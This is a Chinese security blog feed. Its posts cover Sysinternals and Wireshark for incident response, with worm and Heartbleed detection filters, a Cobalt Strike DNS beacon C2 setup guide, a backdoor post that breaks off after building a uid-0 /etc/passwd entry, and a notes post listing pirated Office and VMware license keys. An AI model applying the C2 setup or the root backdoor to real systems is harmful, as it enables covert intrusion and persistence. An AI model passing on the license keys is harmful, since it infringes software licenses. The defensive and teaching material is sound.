<li>autoruns默认会隐藏windows条目，就是有windows签名的在会被隐藏，这个时候要留意时候有windows自带工具的权限维持，在查看的时候要注意将options-&gt;hide microsoft entries的勾去掉。</li>
<li>关于autoruns检查项细节可参考文章<a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&amp;seqNum=2" target="_blank" rel="noopener">Autoruns</a></li>
</ul>
<h2 id="ProcExp"><a href="#ProcExp" class="headerlink" title="ProcExp"></a>ProcExp</h2><ul>
<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer" target="_blank" rel="noopener">官方介绍</a><br><img src="/2020/11/05/蓝队必备技能之-systeminternal工具集使用/procexp.png" alt=""></li>
<li>ProcExp 即process explorer，进程浏览器。用来查看计算机上运行的进程的状态。(CPU、内存、句柄、加载dll、线程及堆栈等)。</li>
<li>打开程序之后会显示一些默认的列，这些显示的列可根据个人喜好进行定制化，比如进程描述、进程状态等。</li>
<li>此外显示项中不同颜色也代表了不同的含义，例如绿色代表新创建的进程，红色代表进程结束、紫色代表当前用户所运行的进程、粉色代表服务、灰色代表挂起了的进程，而且这个颜色方案也可以自定义。</li>
<li>选中某个进程之后，右键可以结束进程、结束进程树、重启进程、挂起进程、dump进程等，双击条目之后可以看到进程的可执行文件以及参数信息、线程、TCP/IP、权限、环境变量、可打印字符串等信息。</li>
<li>除此之外还有一款类似的工具process hacker<h2 id="ProcMon"><a href="#ProcMon" class="headerlink" title="ProcMon"></a>ProcMon</h2></li>
<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank" rel="noopener">官方介绍</a></li>
<li>当怀疑某个进程有问题的时候进行深入排查实时查看这个进程进行了哪些操作，或者实时检测系统某类活动（例如创建、删除文件、修改注册表等）的时候都可以使用procmon，这个工具提供了非常强大的过滤查询语句。这个工具有点类似linux下的strace命令。<br><img src="/2020/11/05/蓝队必备技能之-systeminternal工具集使用/procmon.png" alt=""></li>
<li>此外渗透中也可能用到procmon例如<a href="https://www.jianshu.com/p/638fc1014bdc" target="_blank" rel="noopener">渗透中的procmon</a>。</li>
<li>以及在dll劫持测试的时候也可能用的到。<h2 id="TcpView"><a href="#TcpView" class="headerlink" title="TcpView"></a>TcpView</h2></li>
<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview" target="_blank" rel="noopener">官方介绍</a></li>
<li>TcpView不仅仅可以监测tcp的网络连接还可以监测UDP的，如图所示<br><img src="/2020/11/05/蓝队必备技能之-systeminternal工具集使用/tcpview.png" alt=""></li>
<li>如果需要将ip解析成域名可以在options下拉菜单勾选Resolve Address.Address.</li>
<li>当然也有命令版本的tcpview  Tcpvcon<h2 id="Sysmon"><a href="#Sysmon" class="headerlink" title="Sysmon"></a>Sysmon</h2></li>
<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon" target="_blank" rel="noopener">官方介绍</a></li>
<li><p>Sysmon用来监视和记录系统活动，并记录到windows事件日志，可以提供相关进程创建、网络连接和文件创建更改时间等详细信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">使用方法:</span><br><span class="line">-c 更新或显示配置</span><br><span class="line">-h 指定hash记录的算法</span><br><span class="line">-i 安装，可用xml文件来更新配置文件</span><br><span class="line">-l 记录加载模块，可指定进程</span><br><span class="line">-m 安装事件清单</span><br><span class="line">-n 记录网络链接</span><br><span class="line">-r 检测证书是否撤销</span><br><span class="line">-u 卸载服务和驱动</span><br></pre></td></tr></table></figure>
</li>
<li><p>将Sysmon注册到Windows系统中</p>
</li>
<li>Sysmon.exe -accepteula -i -n<br><img src="/2020/11/05/蓝队必备技能之-systeminternal工具集使用/sysmon.png" alt=""></li>
<li>注意：32 位系统用 Sysmon.exe，64 位 Windows 推荐使用 Sysmon64.exe。<br>注册完成后，在「事件查看器」——「应用程序和服务日志」——「Microsoft」——「Windows」下会多出一项「Sysmon」文件夹，其中记录了 Sysmon 写入到 Event Log 中的所有事件。如果要取消 Sysmon 对系统的监控以及对事件日志的写入操作，可以使用以下命令：<br>Sysmon64.exe -u<br><img src="/2020/11/05/蓝队必备技能之-systeminternal工具集使用/sysmonlog.png" alt=""></li>
<li>此外如果想要单看DNS查询日志，也可在事件查看器中单独设置。在「事件查看器」——「应用程序和服务日志」——「Microsoft」——「Windows」——「DNS ClientEvents 」，右键「Operational 」——选择「启用日志」即可。<br><img src="/2020/11/05/蓝队必备技能之-systeminternal工具集使用/dnslog.png" alt=""></li>
<li><a href="https://github.com/nshalabi/SysmonTools" target="_blank" rel="noopener">Sysmon tools</a></li>
<li><a href="https://github.com/SwiftOnSecurity/sysmon-config" target="_blank" rel="noopener">Sysmon configuration file template with default high-quality event tracing</a></li>
<li>更多使用技巧可参考 <a href="https://www.secrss.com/articles/12585" target="_blank" rel="noopener">应急响应：三款实用的Sysmon辅助分析工具</a><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><a href="https://www.hackers-arise.com/post/2016/11/29/digital-forensics-part-7-live-analysis-with-sysinternals" target="_blank" rel="noopener">Live Analysis with sysinternals</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;在应急遇到windows系统的时候经常会使用systeminterna suite套件，这个套件是由&lt;a
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>wireshark和威胁分析</title>
    <link href="http://kevien.github.io/2020/06/09/wireshark%E5%92%8C%E5%A8%81%E8%83%81%E5%88%86%E6%9E%90/"/>
    <id>http://kevien.github.io/2020/06/09/wireshark和威胁分析/</id>
    <published>2020-06-09T11:14:54.000Z</published>
    <updated>2020-06-09T11:21:42.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文章已首发至先知平台</span><br><span class="line">https://xz.aliyun.com/t/7802</span><br></pre></td></tr></table></figure>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200602145619-29aa870c-a49e-1.jpeg" alt=""></p>
<h2 id="TL；DR"><a href="#TL；DR" class="headerlink" title="TL；DR"></a>TL；DR</h2><ul>
<li>前段时间看了一个介绍wireshark和威胁分析相关的议题（视频演讲和pdf见参考链接），现在抽出点儿时间总结和记录一下。</li>
<li>由于工作需要，那段时间搜集和整理了wireshark基本使用和技巧相关资料，但是总感觉不太完整不够深入，直到看到这个议题之后，深深感觉外国佬是真的细，真的强。</li>
</ul>
<h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><h3 id="wireshark简述"><a href="#wireshark简述" class="headerlink" title="wireshark简述"></a>wireshark简述</h3><ul>
<li>wireshark主要用在网络故障排查、协议分析、流量统计、威胁发现等方面，是安全、运维、开发等从业人员必备技能之一。wireshark抓取OSI七层协议所有数据包并根据内置规则进行协议解析为友好可读的数据实时展示给用户，也可保存下来留后分析。此外类似的抓包工具还有tshark和tcpdump，但由于tshark和tcpdump都是没有GUI且不够友好,所以目前使用wireshark的人更多一些。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200604182512-acc5b930-a64d-1.png" alt=""></li>
</ul>
<h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><ul>
<li>这里要注意区分一下捕获过滤器和应用显示过滤器，捕获过滤器是有选择性的捕获特定数据包，而应用显示过滤器是在开始抓包之后，过滤显示已经抓到的包。捕获过滤器的优先级更高，它能够避免抓取的数据包过大但也可能会错失一些“重要”数据包。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200520210923-1ff91b86-9a9b-1.png" alt=""></li>
<li><p>捕获过滤器遵循BPF（Berkeley Packet Filter）语法<br>例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">host xxx.xxx.xxx.xxx</span><br><span class="line">not ar</span><br><span class="line">net xxx.xxx.xxx.xxx/xx</span><br><span class="line">dst host xxx.xxx.xxx.xxx</span><br><span class="line">port xx</span><br><span class="line">ip</span><br><span class="line">tcp port xx</span><br><span class="line">tcp portrange xx-xx</span><br></pre></td></tr></table></figure>
</li>
<li><p>一些恶意软件的捕获过滤器语句<br>Blasater Worm:<br>• dst port 135 and tcp port 135 and ip[2:2]==48<br>Welchia Worm:<br>• icmp[icmptype]==icmp-echo and ip[2:2]==92 and icmp[8:4]==0xAAAAAAAA<br>Looking for worms calling C2s:<br>• dst port 135 or dst port 445 or dst port 1433 and tcp[tcpflags] &amp; (tcp-syn) != 0 and tcp[tcpflags] &amp; (tcp-ack) = 0 and src net 192.168.0.0/24<br>Heartbleed Exploit:<br>• tcp src port 443 and (tcp[((tcp[12] &amp; 0xF0) &gt;&gt; 4 ) <em> 4] = 0x18) and (tcp[((tcp[12] &amp; 0xF0) &gt;&gt; 4 ) </em> 4 + 1] = 0x03) and (tcp[((tcp[12] &amp; 0xF0) &gt;&gt; 4 ) <em> 4 + 2] &lt; 0x04) and ((ip[2:2] - 4 </em> (ip[0] &amp; 0x0F) - 4 * ((tcp[12] &amp; 0xF0) &gt;&gt; 4) &gt; 69))</p>
</li>
<li>应用显示过滤器常用语法<br>• ICMP traffic: icmp<br>• Source or Destination IP: ip.addr==[x.x.x.x]<br>• Source IP: ip.src==[x.x.x.x/x]<br>• Windows Services: smb || nbns || dcerpc || nbss || dns<br>• Filter out noise: !(arp or icmp or dns)<br>• Search exact ASCII text in TCP packets: tcp contains [blah]</li>
</ul>
<h3 id="wireshark导出对象"><a href="#wireshark导出对象" class="headerlink" title="wireshark导出对象"></a>wireshark导出对象</h3><ul>
<li>wireshark导出对象功能可以导出压缩包、图片、二进制文件等，打过ctf的可能使用过这个技巧。这里不做展开介绍。</li>
</ul>
<h3 id="wireshark个人配置"><a href="#wireshark个人配置" class="headerlink" title="wireshark个人配置"></a>wireshark个人配置</h3><ul>
<li>常见的软件一般都有个人配置的功能，wireshark也一样，你可以定制显示颜色规则、显示的列、对不同协议的定制等等。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200520211027-45d5093c-9a9b-1.png" alt=""></li>
<li>这里重点关注一下定制化显示不同的列，wireshark默认只是显示包编号、时间戳、源ip、目的ip、协议、数据包长度、数据包简要信息，但我们可以根据不同的需求进行定制.<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200520211058-5886cb38-9a9b-1.png" alt=""><br>例如我们可以显示端口的信息。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200520211114-61d8a166-9a9b-1.png" alt=""></li>
<li>友好的显示时间<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200520211132-6cca579a-9a9b-1.png" alt=""></li>
<li>导出个人配置，可以讲自己常用的配置保存下来移植到其它电脑或者分享给他人。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200520211151-78457c76-9a9b-1.png" alt=""></li>
<li>将协议中的某个字段设置为列（也可以将某个字段设置为过滤器）<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200520211206-80ed6712-9a9b-1.png" alt=""></li>
<li>显示ip地址归属地 可参考<a href="https://wiki.wireshark.org/HowToUseGeoIP" target="_blank" rel="noopener">How To Use GeoIP With Wireshark</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200520211227-8dbeb130-9a9b-1.png" alt=""></li>
</ul>
<h3 id="wireshark协议统计和分析"><a href="#wireshark协议统计和分析" class="headerlink" title="wireshark协议统计和分析"></a>wireshark协议统计和分析</h3><ul>
<li>这里主要能够看到抓包的一些属性（时间、大小等）还有流量中协议的分级占比、以及通信时长等信息。</li>
</ul>
<h3 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h3><ul>
<li>不知道大家有没有遇到并思考过这样一个问题，就是我明明通过无线连接的网络，但使用wireshark抓包抓到的是ethernet协议数据包，而不是802.11协议的数据包，这是因为操作系统或网卡驱动程序已经把802.11 转换成以太网协议了，当然你也设置成抓到802.11协议，这个时候需要修改捕获接口选项为监控模式。</li>
<li>参考链接</li>
<li><a href="https://superuser.com/questions/1242454/why-do-i-see-ethernet-ii-protocol-in-wireshark-in-wireless-connection" target="_blank" rel="noopener">why-do-i-see-ethernet-ii-protocol-in-wireshark-in-wireless-connection</a></li>
<li><a href="https://medium.com/debookee/promiscuous-vs-monitoring-mode-d603601f5fa" target="_blank" rel="noopener">promiscuous-vs-monitoring-mode-d603601f5fa</a></li>
</ul>
<h2 id="威胁分析"><a href="#威胁分析" class="headerlink" title="威胁分析"></a>威胁分析</h2><h3 id="基础协议"><a href="#基础协议" class="headerlink" title="基础协议"></a>基础协议</h3><ul>
<li>在分析威胁之前首先应该先了解一些基础的协议流量特征例如icmp、snmp、telnet、ssh、smb等，这里议题作者已经专门制作好了，大家可以去下载并熟悉相应协议的结构和流量的特征。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200520211248-9a4992d0-9a9b-1.png" alt=""></li>
</ul>
<h3 id="在线流量分析"><a href="#在线流量分析" class="headerlink" title="在线流量分析"></a>在线流量分析</h3><ul>
<li><a href="https://cloudshark.io/" target="_blank" rel="noopener">cloudshark</a> 在线分析流量，高亮显示恶意流量和行为，30天试用期</li>
<li><a href="https://packettotal.com/" target="_blank" rel="noopener">PacketTotal</a> 在线分析流量，高亮显示恶意流量和行为，免费使用</li>
<li><a href="NetworkMiner">NetworkMiner工具</a> 图形化界面流量分析工具，有免费和收费版本</li>
<li><a href="http://malware-traffic-analysis.net/" target="_blank" rel="noopener">malware-traffic-analysis.net</a> 1300+恶意软件流量样本，由著名防火墙palo alto公司威胁狩猎团队维护</li>
<li>此外还有一些其它有用的链接<br><a href="https://github.com/Security-Onion-Solutions/security-onion/wiki/Pcaps" target="_blank" rel="noopener">https://github.com/Security-Onion-Solutions/security-onion/wiki/Pcaps</a><br><a href="https://wiki.wireshark.org/Tools" target="_blank" rel="noopener">https://wiki.wireshark.org/Tools</a><br><a href="https://wiki.wireshark.org/SampleCaptures" target="_blank" rel="noopener">https://wiki.wireshark.org/SampleCaptures</a></li>
</ul>
<h3 id="恶意样本分析"><a href="#恶意样本分析" class="headerlink" title="恶意样本分析"></a>恶意样本分析</h3><ul>
<li>恶意样本分析有如下的网站资源<br>• VirusTotal<br>• Hybrid-Analysis<br>• Malwr<br>• Reverse.it<br>• Cuckoosandbox (on-prem)</li>
</ul>
<h3 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h3><ul>
<li>Indicators of Compromise ，可以理解为拥有某个特征之后就可以被打标记为某个恶意软件了，这个特征可能是url、ip、样本的哈希值等。</li>
</ul>
<h3 id="实战分析"><a href="#实战分析" class="headerlink" title="实战分析"></a>实战分析</h3><ul>
<li>在作者议题中作者提供了几个非常精彩的威胁分析实验场景，其中包括imcp隧道、netcat文件传输、netcat反连shell、数据泄漏、勒索软件、供应链攻击等。感兴趣的话大家可以去下载并进行练习。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200520211306-a50b6cf2-9a9b-1.png" alt=""></li>
<li>当然我这里只是对议题进行简单总结概括，如果感兴趣的话大家可以去看一下Reference链接里原作者的视频和课件。<br>最后如果你有一些更好的trick欢迎留言XD</li>
</ul>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.meetup.com/Santa-Barbara-OWASP-Chapter/events/269632100/" target="_blank" rel="noopener">议题介绍</a><br><a href="https://drive.google.com/drive/folders/1HKQCOBlPsqAC1JpRN40kc_Z8hOWcftm1?usp=sharing" target="_blank" rel="noopener">议题资料下载</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>cobaltstrike dns beacon</title>
    <link href="http://kevien.github.io/2020/04/05/cobaltstrike-dns-beacon/"/>
    <id>http://kevien.github.io/2020/04/05/cobaltstrike-dns-beacon/</id>
    <published>2020-04-05T01:29:59.000Z</published>
    <updated>2020-04-22T02:59:09.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2020/04/05/cobaltstrike-dns-beacon/cs.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原文已发布至先知平台</span><br><span class="line">cobaltstrike dns beacon知多少</span><br><span class="line">https://xz.aliyun.com/t/7488</span><br></pre></td></tr></table></figure></p>
<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
<li>cs作者曾说过dns beacon是cs一重要特色，其原因在于绕过防火墙方面比较有优势，之前测试的时候有点儿问题也没有深入研究原理，在最新的cs4.0出来之后又重新测试了一下，然鹅过程是崎岖的，中间踩了几个坑记录一下。<h2 id="原理简介"><a href="#原理简介" class="headerlink" title="原理简介"></a>原理简介</h2></li>
<li>首先我们需要申请一个域名配置好域名解析，例如这里的域名是 malware.com, vps ip地址1.2.3.4，我们需要设置dns的一个A记录，将malware.com的一个子域名指向我们的vps地址，如c2.malware.com</li>
<li>之后我们需要添加一个NS(name server)记录,主机记录可以是dns,记录值是c2.malware.com,NS记录就是将解析任务交由一个指定的”权威”dns服务器(在这里teamserver就是我们的”权威”dns)</li>
<li>梳理一下流程，当我们请求data.dns.malware.com的时候，首先通过递归查询查找到malware.com,之后发现dns.malware.com是由c2.malware.com负责解析，然后这个c2.malware又有A记录,对应ip地址是1.2.3.4，这个时候就可以和1.2.3.4通信了，注意这里需要事先在teamserver上配置dns listener(cs中listener的dns hosts设置为dns.malware.com)，否则无法处理过来的dns请求。<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2></li>
<li>原理明白测试就简单了，配置好cs的dns listener和dns解析之后可以进行一下解析测试，使用dig或nslookup命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dig +trace dns.malware.com</span><br><span class="line">nslookup dns.malware.com c2.malware.com</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>一般会收到来自teamserver 53端口的默认回复地址0.0.0.0，但如果你的cs配置了profile，且设置了dns_idle,那就不是默认的0.0.0.0，而是你dns_idle的值，这个是cs作者用来逃避检测的一种技巧，只能说作者考虑的有点儿全面orz (之前测试的时候我一直没注意到这个点，一直不明白自己为啥总是返回8.8.8.8，简单逆了一下cobaltstrike.jar 大概看下流程也没怎么看懂，也看了teamserve的log除了几个warning也没什么特别的异常，在服务器上抓了流量也没发现异常，也排除了vps限制或者是dns厂商问题，总之各种弯路都走了…最后事实证明这些都是正常的,是自己在启动teamserver的时候自定义了profile里面的dns_idle为8.8.8.8，害！)。<br><img src="/2020/04/05/cobaltstrike-dns-beacon/profile.png" alt=""></p>
<ul>
<li>在beacon上线之后，图标是个黑框，且和http和tcp beacon不一样它没有默认的睡眠60秒，你甚至可能会以为beacon死掉了，其实不然如果想要和beacon交互这个时候需要checkin命令，help checkin可以看到帮助信息，大意就是会让dns beacon强制回连你的teamserver,checkin之后就会发现图标变了，也可以进行交互了，但非常慢，有时候甚至还连不回来，这个时候需要修改一下dns模式，help mode可以看一下具体有什么不同,默认的mode dns数据传输比较慢，可以修改为mode dns-txt 这样传输会快点儿，每次传输189比特的数据，相比A记录每次传输4比特的数据快很多了。<br><img src="/2020/04/05/cobaltstrike-dns-beacon/help.png" alt=""><br><img src="/2020/04/05/cobaltstrike-dns-beacon/checkin.png" alt=""><br>至此，踩坑完毕。。。<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><a href="https://blog.cobaltstrike.com/2016/07/29/cobalt-strike-3-4-operational-details/" target="_blank" rel="noopener">New Malleable C2 Options</a><br><a href="https://www.i0day.com/1957.html" target="_blank" rel="noopener">Cobalt Strike 3.13</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2020/04/05/cobaltstrike-dns-beacon/cs.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2019-note</title>
    <link href="http://kevien.github.io/2019/11/14/2019-note/"/>
    <id>http://kevien.github.io/2019/11/14/2019-note/</id>
    <published>2019-11-14T09:08:58.000Z</published>
    <updated>2020-08-01T02:43:34.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="记录一些乱七八糟的"><a href="#记录一些乱七八糟的" class="headerlink" title="记录一些乱七八糟的"></a>记录一些乱七八糟的</h2><ul>
<li>free hackbar <a href="https://github.com/Mr-xn/hackbar2.1.3" target="_blank" rel="noopener">https://github.com/Mr-xn/hackbar2.1.3</a></li>
<li>一些vmware的镜像 <a href="https://github.com/LubyRuffy/VmwareImages" target="_blank" rel="noopener">https://github.com/LubyRuffy/VmwareImages</a></li>
<li>kali下载地址 <a href="http://dl1.thehackerplaybook.com/THP-vm.zip" target="_blank" rel="noopener">http://dl1.thehackerplaybook.com/THP-vm.zip</a>  账号密码：root toor</li>
<li>吾爱破解论坛【破解专用虚拟机2.0】<a href="https://www.52pojie.cn/thread-661779-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-661779-1-1.html</a></li>
<li>reverse的一些工具 <a href="https://down.52pojie.cn/Tools/" target="_blank" rel="noopener">https://down.52pojie.cn/Tools/</a></li>
<li>office 2010的下载链接：ed2k://|file|en_office_professional_plus_2010_x64_515489.exe|753387136|5BFA4237E2999DA93DB60FBC6131C12D|/，以及激活码：6QFDX-PYH2G-PPYFD-C7RJM-BBKQ8</li>
<li>linux ubuntu Forensics  <a href="https://ftp.nluug.nl/os/Linux/distr/tsurugi/01.Tsurugi_Linux_%5bLAB%5d/TSURUGI_LINUX_2019.1.ova" target="_blank" rel="noopener">https://ftp.nluug.nl/os/Linux/distr/tsurugi/01.Tsurugi_Linux_%5bLAB%5d/TSURUGI_LINUX_2019.1.ova</a>  tsurugi tsurugi</li>
<li>DEF CON 26 - Attacking &amp; Auditing Docker Containers Workshop. <a href="https://sourceforge.net/projects/defcon-26-container-security/" target="_blank" rel="noopener">environment</a><br>Complete detailed repository at <a href="https://github.com/appsecco/defcon-26-workshop-attacking-and-auditing-docker-containers" target="_blank" rel="noopener">https://github.com/appsecco/defcon-26-workshop-attacking-and-auditing-docker-containers</a> </li>
<li>vmware <a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.1-15018445.exe" target="_blank" rel="noopener">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.1-15018445.exe</a>   激活码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ZC10K-8EF57-084QZ-VXYXE-ZF2XF</span><br><span class="line"></span><br><span class="line">UF71K-2TW5J-M88QZ-8WMNT-WKUY4</span><br><span class="line"></span><br><span class="line">AZ7MK-44Y1J-H819Z-WMYNC-N7ATF</span><br><span class="line"></span><br><span class="line">CU702-DRD1M-H89GP-JFW5E-YL8X6</span><br><span class="line"></span><br><span class="line">YY5EA-00XDJ-480RP-35QQV-XY8F6</span><br><span class="line"></span><br><span class="line">VA510-23F57-M85PY-7FN7C-MCRG0</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;记录一些乱七八糟的&quot;&gt;&lt;a href=&quot;#记录一些乱七八糟的&quot; class=&quot;headerlink&quot; title=&quot;记录一些乱七八糟的&quot;&gt;&lt;/a&gt;记录一些乱七八糟的&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;free hackbar &lt;a href=&quot;https://github
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>网络安全平台上线啦！！！</title>
    <link href="http://kevien.github.io/2019/09/05/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%B9%B3%E5%8F%B0%E4%B8%8A%E7%BA%BF%E5%95%A6%EF%BC%81%EF%BC%81%EF%BC%81/"/>
    <id>http://kevien.github.io/2019/09/05/网络安全平台上线啦！！！/</id>
    <published>2019-09-05T02:13:51.000Z</published>
    <updated>2019-12-24T09:27:22.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="网络安全平台上线啦"><a href="#网络安全平台上线啦" class="headerlink" title="网络安全平台上线啦"></a>网络安全平台上线啦</h3><ul>
<li>大家好，网络安全平台上线啦，介四里没有挽过的船新版本，挤需体验三番钟，里造会干我一样，爱象戒宽油系，是兄弟就来pwn我(pwnme.cn)，大家来玩叭~</li>
<li>记住我们的网址是<a href="https://www.pwnme.cn/" target="_blank" rel="noopener">https://www.pwnme.cn/</a><br><img src="/2019/09/05/网络安全平台上线啦！！！/platform1.png" alt=""><br><img src="/2019/09/05/网络安全平台上线啦！！！/platform2.png" alt=""></li>
<li>平台有时候可能会关掉，如有需求请联系我开启 ：）</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;网络安全平台上线啦&quot;&gt;&lt;a href=&quot;#网络安全平台上线啦&quot; class=&quot;headerlink&quot; title=&quot;网络安全平台上线啦&quot;&gt;&lt;/a&gt;网络安全平台上线啦&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;大家好，网络安全平台上线啦，介四里没有挽过的船新版本，挤需体验三番钟，里
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>linux常见backdoor及排查技术</title>
    <link href="http://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/"/>
    <id>http://kevien.github.io/2019/02/16/linux常见backdoor及排查技术/</id>
    <published>2019-02-16T13:38:54.000Z</published>
    <updated>2024-12-06T10:13:46.119Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原文已发布至先知平台</span><br><span class="line">linux常见backdoor及排查技术</span><br><span class="line">https://xz.aliyun.com/t/4090</span><br><span class="line">windows常见backdoor、权限维持方法及排查技术</span><br><span class="line">https://xz.aliyun.com/t/4842</span><br></pre></td></tr></table></figure>
<h2 id="TL；DR"><a href="#TL；DR" class="headerlink" title="TL；DR"></a>TL；DR</h2><p><img src="/2019/02/16/linux常见backdoor及排查技术/backdooropen.jpg" alt=""></p>
<ul>
<li>最近遇到一些和后门相关的技术，所以就把之前的linux backdoor相关笔记重新整理和学习了一下。在这里做一下记录，后续有时间整理一下windows backdoor方面的技术。</li>
<li>在服务器被入侵后进行应急响应无非通过文件排查、网络排查、进程排查、系统信息排查等方法进行入侵排查。下面就一些常见技巧以及公开的工具进行剖析介绍。</li>
<li>现在有一些公司在发现入侵之后直接重装系统，那么基本所有的后门就无法发挥权限维持的作用了，但作为一个安全从业人员还是需要对一些后门有一个基本的了解。<h2 id="常见技巧"><a href="#常见技巧" class="headerlink" title="常见技巧"></a>常见技巧</h2><h3 id="添加root权限后门用户"><a href="#添加root权限后门用户" class="headerlink" title="添加root权限后门用户"></a>添加root权限后门用户</h3></li>
<li>/etc/passwd这个文件包含了系统所有的用户名、ID、登录的shell等信息,这个文件是以分号分隔开的，依次是登录名、密码、用户ID、组ID，用户名、用户的根目录以及登录的shell，其中密码处可以是x(代表加密，存放在/etc/shadow文件中)，也可以直接是加密后的密文，此外用户id为0代表用户会是root的权限，这个时候我们的目标就是在这个文件中追加一条，一个带有密文且id为0的账号。</li>
<li><p>关于密码加密我们可以使用下面的命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#密码M0rk</span><br><span class="line">xxx@ubuntu:~/Desktop$ perl -e &apos;print crypt(&quot;M0rk&quot;, &quot;AA&quot;). &quot;\n&quot;&apos;</span><br><span class="line">AAhmo1jgYI0HE</span><br></pre></td></tr></table></figure>
</li>
<li><p>所以我们最终想要在passwd文件中的条目是这个样子的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backdoor:AAhmo1jgYI0HE:0:0:me:/root:/bin/bash</span><br></pre></td></tr></table></figure>
</li>
<li><p>append the backdoor to passwd file</p>
